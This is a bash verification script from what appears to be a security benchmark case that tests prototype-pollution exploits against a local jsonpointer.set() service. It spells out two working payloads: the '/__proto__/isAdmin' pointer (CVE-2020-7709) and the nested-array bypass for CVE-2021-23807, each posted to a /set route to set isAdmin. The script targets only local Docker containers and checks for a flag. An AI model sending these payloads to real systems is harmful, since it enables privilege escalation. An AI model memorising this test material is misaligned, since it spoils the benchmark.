#!/usr/bin/env bash
# verify.sh (PCBV2-0044, jsonpointer.set() prototype pollution oracle)
#
#   --seed     : pointer="/__proto__/isAdmin"  (CVE-2020-7709 / janl 4.0.1)
#   --residual : pointer=["",["__proto__"],"isAdmin"]  (CVE-2021-23807 nested-array bypass)
#
# Flag channel: GET /check body {"polluted": <PCB_FLAG>}
# Exit: 0 = flag observed, 10 = not observed, 20 = env failure, 30 = usage error.
set -uo pipefail
: "${RUN_ID:?}" "${COMPOSE_PROJECT_NAME:?}" "${RUN_FLAG:?}" "${VERSION:?}" "${WORK_DIR:?}"
MODE="${1:-}"
[[ "$MODE" == "--seed" || "$MODE" == "--residual" ]] || { echo "usage: --seed|--residual" >&2; exit 30; }
CASE_DIR="$(cd "$(dirname "$0")/.." && pwd)"
PY="${PCB_PYTHON:-python3}"
mkdir -p "$WORK_DIR"

if [[ -f "$WORK_DIR/compose.env" ]]; then
  set -a
  # shellcheck disable=SC1091
  source "$WORK_DIR/compose.env"
  set +a
fi

case "$VERSION" in
  v0) PORT="${PORT_V0_0:-}" ;;
  v1) PORT="${PORT_V1_0:-}" ;;
  v2) PORT="${PORT_V2_0:-}" ;;
  *) PORT="" ;;
esac
if [[ -z "$PORT" ]]; then
  PORT="$(docker compose -p "$COMPOSE_PROJECT_NAME" --project-directory "$CASE_DIR" --profile "$VERSION" port "$VERSION" 8080 2>/dev/null | awk -F: 'NF{print $NF; exit}' | tr -d '[:space:]')"
fi
if [[ -z "$PORT" ]]; then
  echo "verify: no host port for $VERSION:8080" >&2
  exit 20
fi
export PCB_TARGET_PORT="$PORT"

if [[ "$MODE" == "--seed" ]]; then
  CAND='{"probe_id":"cve-2020-7709-string-proto","method":"POST","path_route":"/set","pointer":"/__proto__/isAdmin","value":true}'
else
  CAND='{"probe_id":"cve-2021-23807-array-proto","method":"POST","path_route":"/set","pointer":["",["__proto__"],"isAdmin"],"value":true}'
fi
printf '%s' "$CAND" > "$WORK_DIR/cand.json"

ready=0
for _ in $(seq 1 60); do
  code="$(curl -sS -o /dev/null -w '%{http_code}' --max-time 5 "http://127.0.0.1:${PORT}/" || true)"
  if [[ "$code" == "200" ]]; then ready=1; break; fi
  sleep 0.5
done
if [[ "$ready" != "1" ]]; then
  echo "verify: $VERSION not ready on :$PORT" >&2
  exit 20
fi

export PYTHONPATH="$CASE_DIR${PYTHONPATH:+:$PYTHONPATH}"
OUT="$("$PY" "$CASE_DIR/poc/seed_exec.py" "$WORK_DIR/cand.json" "$VERSION" 2>&1)" || { echo "$OUT" >&2; exit 20; }
echo "$OUT" | head -c 800; echo
"$PY" - "$OUT" <<'PYEOF'
import json, os, sys
try:
    d = json.loads(sys.argv[1])
except Exception as e:
    print("verify: bad seed_exec output:", e); sys.exit(20)
body = str(d.get("check_body") or "")
flag = os.environ.get("RUN_FLAG", "")
print("verify: check_body =", body[:200])
sys.exit(0 if flag in body else 10)
PYEOF
